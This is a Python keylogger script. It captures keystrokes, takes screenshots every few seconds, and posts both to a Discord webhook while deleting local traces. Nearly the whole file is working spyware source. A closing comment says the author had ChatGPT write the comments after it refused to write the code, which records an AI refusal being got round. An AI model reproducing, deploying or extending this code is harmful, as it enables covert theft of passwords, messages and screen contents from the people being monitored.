import os
import pyautogui
import requests
import threading
from datetime import datetime

class KeyLogger:
    def __init__(self, webhook_url, time_interval=7):
        self.webhook_url = webhook_url
        self.time_interval = time_interval
        self.images_folder = "images"
        self.text = []

        # Create the images folder if it doesn't exist
        if not os.path.exists(self.images_folder):
            os.makedirs(self.images_folder)

    def get_unique_filename(self):
        """Generate a unique filename using a timestamp."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        return f"{self.images_folder}/screenshot_{timestamp}.png"

    def take_screenshot(self):
        """Take a screenshot and save it with a unique filename."""
        filename = self.get_unique_filename()
        pyautogui.screenshot(filename)
        return filename

    def send_data(self):
        """Send the captured data and screenshot to the webhook."""
        filename = self.take_screenshot()
        with open(filename, "rb") as f:
            files = {"file": (os.path.basename(filename), f, "image/png")}
            data = {"content": "".join(self.text)}
            try:
                requests.post(self.webhook_url, files=files, data=data)
            except Exception as e:
                print(f"Failed to send data: {e}")

        # Delete the screenshot file
        os.remove(filename)

        # Clear the text buffer
        self.text = []

        # Schedule the next send
        threading.Timer(self.time_interval, self.send_data).start()

    def on_press(self, key):
        """Handle key press events."""
        try:
            self.text.append(key.char)
        except AttributeError:
            if key == key.space:
                self.text.append(" ")
            elif key == key.enter:
                self.text.append("\n")
            elif key == key.tab:
                self.text.append("\t")
            elif key == key.backspace:
                if self.text:
                    self.text.pop()
            elif key == key.esc:
                # Stop the keylogger
                return False

    def run(self):
        """Start the keylogger."""
        self.send_data()
        # Start the keyboard listener
        from pynput.keyboard import Listener
        with Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    webhook_url = "Discord_link"
    # i updated this link this is important!!
    #  and also ignore the extra comments i make them using chat_gpt
    # that doesnot giving me the code beacouse of it's fucking laws but commented on this what a idiot
    keylogger = KeyLogger(webhook_url)
    keylogger.run()
